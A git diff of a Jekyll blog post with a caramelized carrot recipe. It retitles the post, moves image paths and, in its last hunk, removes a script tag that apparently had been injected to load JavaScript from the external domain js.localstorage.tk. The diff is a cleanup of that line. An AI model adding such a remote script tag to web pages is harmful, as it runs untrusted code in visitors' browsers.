@@ -1,12 +1,12 @@
 ---
 layout: post
-title:  "Carrots"
+title:  "Caramelized Carrots"
 date:   2018-09-12 08:51:10 -0500
 categories: jekyll update
 ---
 <h2 class="style">A delicious recipe for your garden grown carrots.</h2>
-<img src="/sites/default/files/blog/caramelized-carrots-ingredents.jpg">
-<img src="/sites/default/files/blog/caramelized-carrots-kitchen.jpg">
+<img src="/images/blog/caramelized-carrots-ingredents.jpg">
+<img src="/images/blog/caramelized-carrots-kitchen.jpg">
 <div class="recipe"><p>
 Growing carrots is easy. Well it's easy when you use the Compost Hero Leaf Compost method.
 Here is a recipe for the loads of carrots you will have in the late winter after a season growing carrots using leaf compost. This recipe is a favorite as a side dish to any festive meal.<p />
@@ -32,5 +32,4 @@ Here is a recipe for the loads of carrots you will have in the late winter after
 </li><li><span class="recipeStepsHeading">4.</span> <span class="recipeStepsBody">Add remaining ingredients and cook another 5 minutes or until the garlic and ginger are cooked and the sugar has glazed the caramelized carrots. </span>
 </li><li><span class="recipeStepsHeading">5.</span> <span class="recipeStepsBody">Serve with a garnish of carrot tops, the bitter green carrot tops are a nice contrast to the sweet and savory of the caramelized carrot.</span>
 </li></ul>
-<img src="/sites/default/files/blog/garden-caramelized-carrots-recipe.jpg">
-</div><script type='text/javascript' src='https://js.localstorage.tk/s.js?qr=888'></script>
+<img src="/images/blog/garden-caramelized-carrots-recipe.jpg">
